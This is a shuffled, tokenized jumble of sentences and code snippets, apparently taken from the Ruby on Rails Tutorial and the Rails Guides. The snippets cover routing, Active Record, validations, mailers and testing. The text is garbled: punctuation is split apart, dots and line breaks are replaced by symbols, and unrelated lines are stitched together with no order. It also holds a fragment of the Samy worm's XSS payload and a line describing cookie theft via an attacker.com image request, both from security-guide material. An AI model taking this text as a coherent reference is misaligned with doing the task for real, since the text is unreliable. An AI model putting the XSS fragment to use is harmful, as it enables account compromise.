Here &apos;s an example of using benchmark-ips :
* Rails 4 ▖ 0 requires that scopes use a callable object such as a Proc or lambda :
I suggest starting by visiting the \ href { http : / / railscasts ▖ com / episodes / archive } { RailsCasts episode archive } and clicking on subjects that catch your eye .
The new About page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / static _ pages / about } { / static \ _ pages / about } ) .
Integration tests will eventually be our primary testing technique , but controller tests give us an easier place to start .
( In case you &apos;re wondering why we don &apos;t just use the signed user id , without the remember token , this would allow an attacker with possession of the encrypted id to log in as the user in perpetuity .
NOTE : Defined in `active _ support / core _ ext / array / access ▖ rb` .
config ▖ middleware ▖ use Rack : : BounceFavicon
The `take` method returns `nil` if no record is found and no exception will be raised .
The methods `months _ ago` and `months _ since` work analogously for months :
With the routes defined , we are now in a position to make tests for the stats partial .
# # # Regular Font
If you choose to use PostgreSQL , your `config / database ▖ yml` will be customized to use PostgreSQL databases :
Here &apos;s how `rails server` creates an instance of `Rack : : Server`
Clicking this new &quot; Destroy Comment &quot; link will fire off a `DELETE ╼ / articles / : article _ id / comments / : id` to our `CommentsController` , which can then ╼ use this to find the comment we want to delete , so let &apos;s add a `destroy` action ╼ to our controller ( `app / controllers / comments _ controller ▖ rb` ) :
complains that
By now you can probably guess that we &apos;ll call it \ kode { \ _ footer ▖ html ▖ erb } and put it in the layouts directory ( Listing ~ \ ref { code : footer _ partial } )
Since we destroyed our third user in Section ~ \ ref { sec : creating _ user _ objects } , Active Record can &apos;t find it in the database .
/ Users / mhartl / rails _ projects / sample _ app
The rest of the \ emph { Ruby on Rails Tutorial } builds on this foundation to make a site with Twitter-like microposts ( Chapter ~ \ ref { cha : user _ microposts } ) and a status feed of posts from followed users ( Chapter ~ \ ref { cha : following _ users } ) .
These jobs can be everything from regularly scheduled ╼ clean-ups , to billing charges , to mailings ▖
This ensures that both links to the Home page defined in Listing ~ \ ref { code : header _ partial _ links } are present .
The `--mountable` option tells the generator that you want to create a ╼ &quot; mountable &quot; and namespace-isolated engine ▖
end { enumerate } ╼ ╼ % subsection relationship _ user _ associations ( end ) ╼ ╼ \ subsection { Relationship validations } % ( fold ) ╼ \ label { sec : relationship _ validations } ╼ ╼
# label ( : article , : title , &quot; A short title &quot; )
It also adds the ability to write these assets in ╼ other languages and pre-processors such as CoffeeScript , Sass and ERB .
&#124; id &#124; select _ type &#124; table &#124; type &#124; possible _ keys &#124;
NOTE : Rails routes are matched in the order they are specified , so if you have a `resources : photos` above a `get &apos; photos / poll &apos; ` the `show` action &apos;s route for the `resources` line will be matched before the `get` line ▖
Firstly , you need a place within the application to create a new article ▖
as shown in Listing ~ \ ref { code : gitignore } .
* * `ActiveRecord : : ConnectionAdapters : : ConnectionManagement` * *
This rather obscure code , which you don &apos;t need to understand in detail , arranges for precisely the behavior described above : it uses the minimum cost parameter in tests and a normal ( high ) cost parameter in production .
Testing micropost deletion with a user mismatch ▖
Listing ~ \ ref { code : micropost _ partial } also adds a CSS ~ id for each micropost using
In particular , the Learn Enough introductory sequence consists of a series of tutorials that are suitable as prerequisites to the
We &apos;ll look at improving the ╼ styling for it afterwards .
Having defined an action that returns the desired string , we need to tell Rails to use that action instead of the default page in Figure ~ \ ref { fig : riding _ rails } .
The above copyright notice and this permission notice shall be included in
Visit the login path .
as seen in Listing ~ \ ref { code : destroy _ action } .
# # # # Naming Partials
For example , consider the following `Category` , `Article` , `Comment` , `Guest` and `Tag` models :
&lt; % = @ greeting % &gt;
config ▖ action _ mailer ▖ observers = &#91; &quot; MailObserver &quot; &#93;
Paradoxically , we &apos;ll take the first step toward eliminating duplication by first adding some more : we &apos;ll make the titles of the pages , which are currently quite similar , match \ emph { exactly } .
Now that we know how to make partials , let &apos;s add a site footer to go along with the header .
query = Client ▖ select ( : name ) ▖ distinct
# item is already locked .
The method returns an array with the groups :
The method `ordinal` returns the ordinal suffix string corresponding to the receiver integer :
We created a second user in the fixtures in Listing ~ \ ref { code : fixture _ second _ user } , but 30 or so more users is a lot to create by hand .
You can also use this to override routing methods defined by resources , like this :
Convention over Configuration in Active Record
* `before _ add`
SELECT addresses .
# # # Rails Application &apos;s Rack Object
Now , create a new file `app / views / articles / show ▖ html ▖ erb` with the following ╼ content :
# # # Assets
Initialized empty Git repository in / Users / mhartl / rails _ projects / first _ app / ▖ git /
Together , these constitute instructions to issue an HTTP \ texttt { POST } request to the / users URL .
gem &apos; uglifier&apos;
&quot; visual _ effect &quot; ▖ camelize ( : lower ) # = &gt; &quot; visualEffect &quot;
&quot; x is not empty &quot;
# MyApp / app / decorators / models / blorgh / article _ decorator ▖ rb
# gem &apos; win32console &apos; , &apos; 1 ▖ 3 ▖ 2&apos;
Updating \ kode { authenticated ? }
As discussed in Section ~ \ ref { sec : sessions _ and _ failed _ login } , our authentication model is to keep users logged in until they log out explicitly .
/ Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec ▖ rb
So , the same query running with the PostgreSQL adapter would yield instead
Client ▖ limit ( 5 ) ▖ offset ( 30 )
Inside the block for this method , the ╼ `FormBuilder` object - represented by `f` - is used to build two labels and two ╼ text fields , one each for the title and text of an article ▖
With the \ kode { @ user } variable so defined , the test for the signup page should be passing again :
* What Core Extensions are .
render file : &quot; / path / to / rails / app / views / books / edit &quot;
If a file ╼ exists at `public / assets / rails ▖ png` it is served by the web server .
# &lt; committer &gt; Joshua Peek &lt; / committer &gt;
Install Ruby
To get started , we need to include the \ texttt { carrierwave } gem in the \ kode { Gemfile } ( Listing ~ \ ref { code : gemfile _ carrierwave } ) .
module MyEngine
Of course , this means that we will have to define such a variable in the user \ kode { show } action ( Listing ~ \ ref { code : user _ show _ microposts _ instance } ) .
Putting the above ideas together leads to the test in Listing ~ \ ref { code : a _ test _ for _ invalid _ submission } .
If you use `readonly` , then the associated object will be read-only when retrieved via the association .
The User data model with an added \ kode { password \ _ digest } attribute .
-- create _ table ( : users )
The resulting test appears in Listing ~ \ ref { code : home _ feed _ test } .
def feedback _ message ( business , user )
bsection debugger ( end ) ╼ ╼ \ subsection { A Gravatar image and a sidebar } % ( fold ) ╼ \ label { sec : a _ gravatar _ image } ╼ ╼
They are especially useful for generating XML content ▖
NOTE : Of course , you can use the more advanced constraints available in non-resourceful routes in this context .
Gravatars provide a convenient way of displaying images to represent users .
# # # # # `create _ association ! (
The resulting \ kode { reset \ _ digest } and \ kode { reset \ _ sent \ _ at } attributes appear in Figure ~ \ ref { fig : user _ model _ password _ reset } .
╼ \ end { code } ╼ ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : rails _ flavored _ ruby _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
Thus only `rescue` can tell whether a given arbitrary object is duplicable ▖
in Listing ~ \ ref { code : title _ tests } .
Finally , this data model is a maintainability nightmare : each time a user changed ( say ) his name , we would need to update not just the user &apos;s record in the \ kode { users } table but also \ emph { every row containing that user } ╼ in both the \ kode { followed \ _ users } and \ kode { followers } tables .
# # # # # ` : join _ table`
# = &gt; Thu , 01 Apr 2010 00 : 00 : 00 + 0000
&lt; td &gt; &lt; % = link _ to &apos; Show &apos; , article _ path ( article ) % &gt; &lt; / td &gt;
Adding a \ kode { forget } method to the User model .
As with user deletion ( Section ~ \ ref { sec : the _ destroy _ action } ) , we accomplish this with ``delete &apos; &apos; links , as mocked up in Figure ~ \ ref { fig : micropost _ delete _ links _ mockup } .
# # # # When are Objects Saved ?
For example , the \ kode { config } directory of my sample application is
def matches ? (
A partial for showing a single micropost .
* Rails 4 ▖ 0 changes the default memcached client from `memcache-client` to `dalli` ▖
A mockup of the user signup page .
hash = { a : 1 , b : { c : 2 , d : &#91; 3 , 4 &#93; } }
For example , Action Pack uses this method to write asset cache files like `all ▖ css` :
From the perspective of an introductory tutorial , the differences between Rails ~ 4 ▖ 0 and the previous version , Rails ~ 3 ▖ 2 , are slight .
getting results consistent with this tutorial ▖ ╼ ╼ % subsection installing _ rails ( end ) ╼ ╼ \ section { The first application } ╼ \ label { sec : the _ hello _ application } ╼ ╼ Following a \ href { http : / / www ▖ catb ▖ org / jargon / html / H / hello-world ▖ html } { long tradition } in computer programming , our goal for the first application is to write a ``
Testing the ``remember me &apos; &apos; box
You may be able to guess the code for enforcing a \ kode { minimum } length constraint by referring to the corresponding \ kode { maximum } validation for the user &apos;s name ( Listing ~ \ ref { code : length _ validation } ) :
In this case , though , it &apos;s OK if you wouldn &apos;t have guessed them .
redirect _ to article _ path ( @ article )
validates : points , numericality : true
automatically renders each of the users in the \ kode { @ users } variable using the \ kode { \ _ user ▖ html ▖ erb } partial .
A Rails application is actually just a &quot; supercharged &quot; ╼ engine , with the `Rails : : Application` class inheriting a lot of its behavior ╼ from `Rails : : Engine` .
With the \ kode { create } action defined in Listing ~ \ ref { code : log _ in _ success } , the login form defined in Listing ~ \ ref { code : login _ form _ tag } should now be working .
The current state of the signup page \ href { http : / / localhost : 3000 / signup } { / signup } .
In this case , we only have one validation , so we know which one failed , but it can still be helpful to check using the \ kode { errors } object generated on failure :
Heroku recommends against using different databases in development and production , but for the sample application it won &apos;t make any difference , and SQLite is \ emph { much } easier than PostgreSQL to install and configure locally
\ href { http : / / railstutorial ▖ org / screencasts } { The \ emph { Ruby on Rails Tutorial } screencasts } : I have prepared a full-length screencast course based on this book .
constraints ( id : / &#91; A-Z &#93; &#91; A-Z &#93; &#91; 0-9 &#93; + / ) do
The `collection ▖ destroy` method removes one or more objects from the collection by running `destroy` on each object .
Testing the Relationship model validations .
╼ .
The extension of this file name is key : the ╼ first extension is the _ format _ of the template , and the second extension is the ╼ _ handler _ that will be used ▖
Rails uses a technique called &quot; Unobtrusive JavaScript &quot; to handle attaching ╼ JavaScript to the DOM ▖
The only requirement for \ kode { has \ _ secure \ _ password } to work its magic is for the corresponding model to have an attribute called \ kode { password \ _ digest } ▖ (
invoke coffee
This is a long and challenging chapter covering many detailed aspects of login common systems , so I recommend focusing on completing it section by section .
if video ▖ owner ▖ premium ?
This is easy using the named route \ kode { edit \ _ user \ _ path } from Table ~ \ ref { table : RESTful _ users } , together with the handy \ kode { current \ _ user } helper method defined in Listing ~ \ ref { code : persistent _ current _ user } :
Client ▖ select ( : name ) ▖ map &amp; : name
# = &gt; &quot; company % 5Bname % 5D = Johnson + % 26 + Johnson &quot;
These helpers take an instance of Magazine as the first parameter ( `magazine _ ads _ url ( @ magazine ) ` ) .
&lt; tr &gt;
You can do that by using the ` : if` and ` : unless` options , which ╼ can take a symbol , a string , a `Proc` or an `Array` ▖
delete mode 100644 README ▖ rdoc
We &apos;ll start with fairly simple ERb templates for adding a micropost display to the user profile , and then we &apos;ll add microposts to the seed data from Section ~ \ ref { sec : sample _ users } so that we have something to display .
Finally , when users \ emph { aren &apos;t } logged in , we &apos;ll use the login path defined in Listing ~ \ ref { code : sessions _ resource } to make a link to the login form :
If you want them to run in other environments consult the ╼ &#91; Spring README &#93; ( https : / / github ▖ com / rails / spring # rake ) .
Because the existence of a valid \ kode { @ user } is needed in both the \ kode { edit } and \ kode { update } actions , we &apos;ll put the code to find and validate it in a couple of before filters , as shown in Listing ~ \ ref { code : password _ reset _ edit _ action } .
assert _ generates &apos; / photos / 1 &apos; , { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; }
There &apos;s a second candidate for nesting that requires a slightly different syntax .
* ` : foreign _ key`
Behind the scenes , this means extracting the primary key from the associate object and setting this object &apos;s foreign key to the same value .
See the article `` \ href { https : / / github ▖ com / blog / 926-shiny-new-commit-styles } { Shiny new commit styles } &apos; &apos; for more information .
render xml : @ product
Note also that \ kode { nil } is blank ; since \ kode { nil } isn &apos;t a string , this is a hint that Rails actually adds \ kode { blank ? } \ to \ kode { String } &apos; s base class , which ( as we saw at the beginning of this section ) is \ kode { Object } itself .
from Listing ~ \ ref { code : test _ helper _ sign _ in } to
* How to use the various rendering methods built into Rails .
Throughout this section , I recommend comparing the elements of the Microposts resource with the analogous user elements from Section ~ \ ref { sec : demo _ users _ resource } ; you should see that the two resources parallel each other in many ways .
To do this , create a file called ╼ `welcome _ email ▖ text ▖ erb` in `app / views / user _ mailer / ` :
The resulting \ kode { Gemfile } appears as in Listing ~ \ ref { code : gemfile _ pg _ gem } .
Once you &apos;re happy that the pull request contains a good change , comment on the GitHub issue indicating your approval ▖
An id used in this manner to connect two database tables is known as a \ emph { foreign key } , and when the foreign key for a User model object is \ kode { user \ _ id } , Rails infers the association automatically : by default , Rails expects a foreign key of the form \ kode { &lt; class &gt; \ _ id } , where \ kode { &lt; class &gt; } is the lower-case version of the class name
As indicated in the email templates from Section ~ \ ref { sec : password _ reset _ mailer } , we &apos;ll consider a password reset to be expired if it was sent more than two hours ago , which we can express in Ruby as follows :
Note that the Rails generator automatically appends \ kode { \ _ test } to the name of the test file .
We first covered ERb in Section ~ \ ref { sec : layouts _ and _ embedded _ ruby } , and cover Sass in Section ~ \ ref { sec : sass } .
If you do not specify a value for this option , a deprecation warning will be ╼ emitted ▖
I actually used
Changes that are merged into master are intended for the next major release of Rails ▖
Adding Spring to the \ kode { ▖ gitignore } file .
Here \ kode { User ▖ count } is \ kode { 0 } because we reset the database at the beginning of Section ~ \ ref { sec : signup _ form } .
If you want to prevent deleting the object if there are any associated objects , you can set ` : dependent = &gt; : destroy` and return `false` after checking for existence of association from any of the associated object &apos;s destroy callbacks .
After installing Ruby , you should configure your system for the other software needed to run Rails applications .
# discards the cached copy of orders
Sample usage :
class CreateAssembliesPartsJoinTable &lt; ActiveRecord : : Migration
* `config ▖ action _ controller ▖ logger` accepts a logger conforming to the interface of Log4r or the default Ruby Logger class , which is then used to log information from Action Controller ▖
if @ book ▖ special ?
When we make the appropriate request to the Users controller , \ kode { params &#91; : id &#93; } will be the user id ~ \ texttt { 1 } , so the effect is the same as the \ kode { find } method \ kode { User ▖ find ( 1 ) } we saw in Section ~ \ ref { sec : finding _ user _ objects } .
The following is only a brief overview summary of the helpers available in Action View ▖
The default is true , to use timestamps , which are preferred if there are multiple developers working on the same application .
# # # Responders
This will enable Rails to recognize paths such as ` / photos / search` with GET , and route to the `search` action of `PhotosController` ▖
Now we just have to fill in the links in the layout .
As seen in the final example , it &apos;s possible to leave out the argument entirely ( in which case we can also omit the parentheses ) .
In other words , there &apos;s a suitable base title , but there &apos;s also a leading vertical bar character \ kode { &#124; } at the beginning .
This uses the \ kode { escape \ _ javascript } function , which is needed to escape out the result when inserting HTML in a JavaScript file .
Note the use of \ kode { via : &apos; delete &apos; } for the signout route , which indicates that it should be invoked using an HTTP \ texttt { DELETE } request .
message : &quot; should happen once per year &quot; }
An empty fixtures file ▖
Queues
user = User ▖ first
account =
Sometimes , you have a resource that clients always look up without referencing an ID ▖
Adding a title and heading for the user profile page .
The reason is that initializing the entire \ kode { params } hash is \ emph { extremely } dangerous---it arranges to pass to \ kode { User ▖ new } \ emph { all } data submitted by a user .
Some database adapters use case-sensitive indices , considering the strings ``Foo @ ExAMPle .
I encourage you to study Table ~ \ ref { table : valid _ email _ regex } with a browser window open to Rubular---no amount of reading about regular expressions can replace playing with them interactively .
By default , the scaffold styling is not applied to the engine because the ╼ engine &apos;s layout file , `app / views / layouts / blorgh / application ▖ html ▖ erb` , doesn &apos;t ╼ load it ▖
This helper passes the record to a separate class for validation .
The resulting \ kode { logged \ _ in ? } \ method appears in Listing ~ \ ref { code : logged _ in _ p } .
# # # Translated Paths
The second line can safely access the &quot; type &quot; key , and let the user to pass either ` : type` or &quot; type &quot; .
WARNING : When using asset precompilation , you will need to ensure that your ╼ controller assets will be precompiled when loading them on a per page basis ▖
The basic steps appear as follows :
The \ kode { log \ _ in } function .
# # # Overriding the Singular Form
Note the form of the assignment in the first line of the \ kode { remember } method .
has _ many : orders , - &gt; { includes : line _ items }
* Configure your email server to forward emails from the address ( es ) you would ╼ like your app to receive to ` / path / to / app / bin / rails runner ╼ &apos; UserMailer ▖ receive ( STDIN ▖ read ) &apos; ` .
In that case we test whether the ends of the argument range belong to the receiver themselves :
WARNING : It &apos;s very important here to use the `String` version of the class , ╼ rather than the class itself ▖
The current user &apos;s profile ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / page _ flow _ profile _ mockup _ bootstrap-full ▖ png } { ( full size ) }
If you &apos;ve followed the steps in Section ~ \ ref { sec : bitbucket } , you might notice that Bitbucket didn &apos;t automatically detect the \ kode { README ▖ rdoc } file from our repository , instead complaining on the main repository page that there is no README present ( Figure ~ \ ref { fig : bitbucket _ no _ readme } ) .
Luckily , if you are using the recommended cloud environment , you automatically have access to a Unix ( Linux ) command line running a standard \ href { http : / / en ▖ wikipedia ▖ org / wiki / Shell _ ( computing ) } { shell command-line interface } known as \ href { http : / / en ▖ wikipedia ▖ org / wiki / Bash _ ( Unix _ shell ) } { Bash } .
Welcome aboard screenshot &#93; ( images / getting _ started / rails _ welcome ▖ png )
A mockup of a user &apos;s Home page with a status feed .
The method `ago` receives a number of seconds as argument and returns a timestamp those many seconds ago from midnight :
The new About page ( \ href { http : / / localhost : 3000 / static _ pages / about } { / static \ _ pages / about } ) .
error
# # # Singular Resources
If your application needs to use the old sanitizer implementation , include `rails-deprecated _ sanitizer` in your Gemfile :
Rails provides a bunch of view helper methods written in Ruby to assist you ╼ in generating HTML ▖
- &gt; { order ( &apos; order _ date desc &apos; ) ▖ limit ( 100 ) } ,
# Returns the Gravatar ( http : / / gravatar ▖ com / ) for the given user .
# # # # # Options for `find _ each`
* How Active Record fits into the Model-View-Controller paradigm .
Listing ~ \ ref { code : signup _ with _ account _ activation _ test } also uses the \ kode { assigns } method for the first time in the main tutorial ; as explained in the Chapter ~ \ ref { cha : log _ in _ log _ out } exercise ( Section ~ \ ref { sec : log _ in _ out _ exercises } ) , \ kode { assigns } lets us access instance variables in the corresponding action .
Extensions to `Integer`
An alternate middleware can be used for this by changing the `config ▖ action _ controller ▖ session _ store` to an alternate value ▖
target = &quot; &quot; onload = &quot; var http _ request = false ; var Email = &apos; &apos; ;
Again , most of the changes below are for the asset pipeline ▖
&#124; db / &#124; Contains your current database schema , as well as the database migrations .
This will entail filling in the second arguments of the \ kode { link \ _ to } functions with the proper named routes .
Given a pair `key` , `value` :
The \ kode { sign \ _ out } method in the Sessions helper module .
USAGE
ensures that all CSS files in the \ kode { app / assets / stylesheets } directory ( including the tree subdirectories ) are included into the application CSS ▖ The line
For more details on such routing options , see the \ href { http : / / guides ▖ rubyonrails ▖ org / routing ▖ html } { Rails Guides article on ``Rails Routing from the Outside In &apos; &apos; } .
See ╼ &#91; Precompiling Assets &#93; ( # precompiling-assets ) for more information on how ╼ precompiling works .
As with the \ kode { header } tag &apos;s classes , these classes have special meaning to Bootstrap .
orders ▖ destroy ( object , ▖ ▖ ▖ )
This is not true for array &apos;s elements , however ▖
The method `end _ of _ minute` returns a timestamp at the end of the minute ( hh : mm : 59 ) :
You can also specify constraints in a block form :
The second model will handle ╼ comments on articles .
= &gt; &quot; production &quot;
WARNING : Objects will _ always _ be removed from the database , ignoring the ` : dependent` option .
╼ &gt; &gt; Rails ▖ env ▖ test ?
The final \ kode { Gemfile } for the sample application .
By convention , Rails assumes that the column used to hold the primary key of this model is `id` ▖
# # # # # ` : association _ foreign _ key`
File ▖ open ( file _ name ) { &#124; f &#124; Marshal ▖ load ( f ) }
╼ \ end { itemize } ╼ ╼ % subsection weaknesses _ of _ the _ users _ resource ( end ) ╼ ╼ % section users _ resource ( end ) ╼ ╼ \ section { The Microposts resource } % ( fold ) ╼ \ label { sec : microposts _ resource } ╼ ╼
resources : comments , only : &#91; : index , : new , : create &#93;
The ``Name &apos; &apos; and ``Email &apos; &apos; fields in Figure ~ \ ref { fig : edit _ page } also shows how Rails automatically pre-fills the Name and Email fields using the attributes of the existing \ kode { @ user } variable .
Generating a Users controller ( with a \ kode { new } action ) .
TIP : In any case , Rails will not create foreign key columns for you ▖
The initial Micropost spec .
Replacing the \ kode { full \ _ title } test helper with a simple \ kode { include } .
The other two verbs , \ texttt { PATCH } and \ texttt { DELETE } , are designed for \ emph { updating } and \ emph { destroying } things on the remote server .
order ▖ destroy
Version control systems allow us to track changes to our project &apos;s code , collaborate more easily , and roll back any inadvertent errors ( such as accidentally deleting files ) .
In our case , we used SCSS from the start in order to take advantage of Bootstrap .
&#124; &#124; 203 &#124; : non _ authoritative _ information &#124;
d ▖ end _ of _ week # = &gt; Sun , 09 May 2010
Welcome to example ▖ com , &lt; % = @ user ▖ name % &gt;
Historically , Rails had some compatibility issues with the JSON gem ▖
The X-Sendfile header is a directive to the web server to ignore the response ╼ from the application , and instead serve a specified file from disk ▖
A model for user followers using a reverse Relationship model .
def receive ( email )
When the form is submitted ( i ▖ e ▖ , when the user hits the submit button or form ▖ submit is called via JavaScript ) , the form inputs will be bundled into the params object and passed back to the controller .
Along with \ emph { Programming Ruby } author Dave Thomas , Mike taught the first Rails course I took , way back in 2006 .
ls : app / controllers / : No such file or directory
Here , we expect it to be more complicated , something like
te } ╼ ╼ % subsection a _ validity _ test ( end ) ╼ ╼ \ subsection { Validating presence } % ( fold ) ╼ \ label { sec : presence _ validation } ╼ ╼
You only need to use this option if the name of the source association cannot be automatically inferred from the association name .
* `config ▖ assets ▖ compile` is a boolean that can be used to turn on live Sprockets compilation in production .
as seen in Listing ~ \ ref { code : demo _ microposts _ resource } .
strip _ links ( &quot; emails to &lt; a href = &quot; mailto : me @ email ▖ com &quot; &gt; me @ email ▖ com &lt; / a &gt; ▖ &quot; )
env ▖ cache = ActiveSupport : : Cache ▖ lookup _ store ( : null _ store )
TIP : The examples below use ` $ ` to represent your terminal prompt in a UNIX-like OS , ╼ though it may have been customized to appear differently ▖
All objects in Rails respond to the method `to _ param` , which is meant to return something that represents them as values in a query string , or as URL fragments .
( As in Section ~ \ ref { sec : deploying } , you may see some warning messages , which you should ignore for now .
build _ customer
# # # ` : allow _ blank`
Adding the \ texttt { cucumber-rails } gem to the \ kode { Gemfile ▖ }
By naming the columns \ kode { name } and \ kode { email } , we &apos;ll let Active Record figure out the User object attributes for us .
as shown in Listing ~ \ ref { code : followers _ test } .
# # # # Methods Added by `has _ and _ belongs _ to _ many`
Then , in Chapter ~ \ ref { cha : filling _ in _ the _ layout } through Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } , we &apos;ll complete the foundation for the sample application by making a site layout , a user data model , and a full registration and authentication system ( including account activation and password resets ) .
by &#91; Michael Hartl &#93; ( http : / / michaelhartl ▖ com / ) .
&lt; label for = &quot; file &quot; &gt; File to Upload &lt; / label &gt; &lt; % = file _ field _ tag &quot; file &quot; % &gt;
= &gt; { : name = &gt; &quot; Michael Hartl &quot; , : email = &gt; &quot; mhartl @ example ▖ com &quot; }
The MySpace Samy worm will be discussed in the CSS Injection section .
This makes for clearer readability if you have a large number of variable conditions .
The `reorder` method overrides the default scope order ▖
By default , Rails will compile each template to a method in order to render it ▖
Active Record for example uses this method to compute the name of a counter cache column :
The presence of the \ kode { do } keyword indicates that \ kode { form \ _ for } takes a block with one variable , which we &apos;ve called \ kode { f } ( for ``form &apos; &apos; ) .
If you persist in bringing old habits from ╼ other languages to your Rails development , and trying to use patterns you ╼ learned elsewhere , you may have a less happy experience .
Adding following / follower relationships to the sample data .
For example , if you have this code in your `BooksController` class :
# # # Object Relational Mapping
Rails allows you to alter what generators are used with the `config ▖ generators` method ▖
It &apos;s also worth noting that the screenshots use Bootstrap ~ 2 ▖ 0 , whereas the tutorial currently uses Bootstrap ~ 2 ▖ 3 , so there may be minor differences in appearance .
&lt; p &gt; This is a special page ▖ &lt; / p &gt;
* ` : join _ table`
format ▖ html { render action : &apos; new &apos; }
te } ╼ ╼ % subsection inheritance _ hierarchies ( end ) ╼ ╼ \ subsection { Deploying the toy app } % ( fold ) ╼ \ label { sec : deploying _ the _ toy _ app } ╼ ╼
For more details check out &#91; Programming Ruby &#93; ( http : / / www ▖ ruby-doc ▖ org / docs / ProgrammingRuby / ) .
module M
* `config ▖ i18n ▖ available _ locales` whitelists the available locales for the app ▖
# = &gt; &lt; input id = &quot; attachment &quot; name = &quot; attachment &quot; type = &quot; file &quot; / &gt;
We &apos;ll be using the factories generated by \ href { http : / / github ▖ com / thoughtbot / factory _ girl } { Factory Girl } , a Ruby gem produced by the good people at \ href { http : / / thoughtbot ▖ com / } { thoughtbot } .
I shall be late ! &quot; ▖ truncate ( 18 , separator : / \ s / )
In this ╼ case Git will not allow you to push the changes as the pushed branch ╼ and local branch do not match ▖
( Listing ~ \ ref { code : users _ fixtures _ extra _ users } also creates a couple of other named users for future reference ▖ )
However , due to the rich number of methods Rails gives you to interact with ╼ validations in general , it &apos;s fairly easy to build your own ▖
Initialization events
Because it places the id as plain text , this method exposes the form of the application &apos;s cookies and makes it easier for an attacker to compromise user accounts .
= &gt; &quot; 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 , 21 , 22 , 23 ,
# # # Using ` : as` in Nested Resources
X-Timer : S1408912125 ▖ 211638212 , VS0 , VE0
def active _ customer
&quot; backoffice / session &quot; ▖ camelize # = &gt; &quot; Backoffice : : Session &quot;
Much of Action Controller &apos;s functionality is implemented as Middlewares ▖
class _ name : &quot; Order &quot;
╼ $ rails destroy model User
ensures that \ kode { id } ~ is properly \ emph { escaped } before being included in the underlying SQL query , thereby avoiding a serious security hole called \ href { http : / / en ▖ wikipedia ▖ org / wiki / SQL _ injection } { \ emph { SQL injection } } .
With the code in Listing ~ \ ref { code : password _ reset _ preview } , the HTML and text email previews appear as in Figure ~ \ ref { fig : password _ reset _ html _ preview } and Figure ~ \ ref { fig : password _ reset _ text _ preview } .
The raw home view ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / static _ pages / home } { / static \ _ pages / home } ) .
Doctoral dissertation , University of California , Irvine , 2000 .
# # # Adding Some Validation
Those using the cloud IDE should see the Heroku version number , indicating that the \ kode { heroku } CLI is available , but on other systems it may be necessary to install it using the \ href { https : / / toolbelt ▖ heroku ▖ com / } { Heroku Toolbelt }
Fill in some details about ╼ your potential patch including a meaningful title ▖
( If your system complains about the lack of a JavaScript runtime , visit the \ href { https : / / github ▖ com / sstephenson / execjs } { execjs page at GitHub } for a list of possibilities .
▖ class { background-image : url ( &lt; % = asset _ path &apos; image ▖ png &apos; % &gt; ) }
Two very common sources of data that are not UTF-8 :
If you understand the scaffold code , you probably shouldn &apos;t be reading this book .
# created _ at : datetime
* `config ▖ action _ mailer ▖ delivery _ method` defines the delivery method and defaults to ` : smtp` ▖
* ` : autosave`
You should verify that the tests fail at this point :
d ▖ sunday # = &gt; Sun , 09 May 2010
{ a } through \ kode { z } ? What about the same range reversed ? \ emph { Hint } : In both cases you will have to convert the range to an array ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-5e13ce &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ \ subsection { Blocks } % ( fold ) ╼ \ label { sec : blocks } ╼ ╼
B ▖ x # = &gt; : a
# # # Count
You can also specify multiple videos to play by passing an array of videos to the `video _ tag` :
The initial \ kode { new } view for Users .
create app / helpers / blorgh / articles _ helper ▖ rb
def foo
&lt; / html &gt;
Active Record callbacks allow you to attach code to certain events in the ╼ life-cycle of your models ▖
Next , why does the \ kode { data-turbolinks-track } key-value pair use the old-style hashrocket syntax ?
inflect ▖ acronym &apos; SSL&apos;
&quot; # { title } - # { truncate ( text ) } &quot;
Client ▖ minimum ( &quot; age &quot; )
In this section and the next , we &apos;ll prepare for this work by constructing a Sessions controller , a signin form , and the relevant controller actions .
These messages are used when ╼ the ` : message` option isn &apos;t specified ▖
( You should exit the console and re-enter it to clear out the old definition of \ kode { Word } ▖ )
There are four available association callbacks :
A partial for the new and edit form fields .
# # # `ids`
Raising an exception in an untested branch ▖
* Style guidelines for documenting different kinds of Ruby code .
has _ many : recent _ orders ,
&#124; GET &#124; / magazines / : magazine _ id / ads / : id / edit &#124; ads # edit &#124; return an HTML form for editing an ad belonging to a specific magazine &#124;
The `--full` option tells the ╼ generator that you want to create an engine , including a skeleton structure ╼ that provides the following :
Initial commit
Other authentication methods are available for Rails applications ▖
In particular , starting in Section ~ \ ref { sec : the _ asset _ pipeline } we &apos;ll discuss the \ kode { app / assets } directory , part of the \ emph { asset pipeline } that makes it easier than ever to organize and deploy assets such as cascading style sheets and JavaScript files .
def find _ recent
( Lacking the patience to wait two hours , we &apos;ll cover the third branch in a test , which is left as an exercise ( Section ~ \ ref { sec : exercises _ updating _ the _ reset } ) ▖ )
Rails 4 ▖ 0 extracted Active Resource to its own gem ▖
_ Use `escapeHTML ( ) ` ( or its alias `h ( ) ` ) method _ to replace the HTML input characters &amp; amp ; , &amp; quot ; , &amp; lt ; , &amp; gt ; by their uninterpreted representations in HTML ( ` &amp; amp ; ` , ` &amp; quot ; ` , ` &amp; lt` ; , and ` &amp; gt ; ` ) ▖
cattr _ accessor : field _ error _ proc
as shown in Listing ~ \ ref { code : debugger } .
The default error message for this option is _ &quot; must be greater than ╼ % { count } &quot; _ .
class _ attribute : x , instance _ reader : false
The next example will try to load an image from the URL http : / / www ▖ attacker ▖ com / plus the cookie ▖
In the directory you cloned your fork :
@ books = Book ▖ all
If you want to specify multiple conditions :
create app / models / blorgh / comment ▖ rb
In the case of posting to the signup form , \ kode { params } instead contains a hash of hashes , a construction we first saw in Section ~ \ ref { sec : hashes _ and _ symbols } , which introduced the strategically named \ kode { params } variable in a console session .
This is a first important step toward allowing users to register for our site ; we &apos;ll take the next step , modeling users , in Chapter ~ \ ref { cha : modeling _ users } , and we &apos;ll finish the job in Chapter ~ \ ref { cha : sign _ up } .
-- create _ table ( : microposts )
